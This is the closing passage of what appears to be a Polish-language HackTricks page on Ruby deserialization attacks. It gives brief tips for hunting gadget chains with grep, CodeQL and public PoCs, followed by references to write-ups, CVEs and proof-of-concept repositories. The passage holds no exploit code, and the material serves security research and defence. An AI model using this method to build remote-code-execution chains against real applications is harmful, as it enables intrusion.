- Background job backends and file-backed object stores
- Any custom persistence or transport of binary object blobs

Zindustrializowane wykrywanie gadgetów:
- Szukaj (grep) konstruktorów, `hash`, `_load`, `init_with` lub metod powodujących efekty uboczne wywoływanych podczas unmarshal
- Użyj zapytań CodeQL dla Ruby dotyczących unsafe deserialization, aby prześledzić sources → sinks i ujawnić gadgets
- Weryfikuj za pomocą publicznych wieloformatowych PoCs (JSON/XML/YAML/Marshal)


## Referencje

- Trail of Bits – Marshal madness: Krótka historia exploitów deserializacji w Ruby: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x: Uniwersalny łańcuch gadgetów deserializacji prowadzący do RCE: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4: łańcuch Marshal: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 — niebezpieczna deserializacja): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Odkrywanie łańcuchów gadgetów w Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – gadget dla Ruby 3.4: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – uniwersalny łańcuch dla Ruby 3.4: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Wydanie Ruby 3.4.0-rc1: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Poprawka Ruby PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Audyt RubyGems.org (znaleziska dotyczące Marshal): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)

{{#include ../../banners/hacktricks-training.md}}
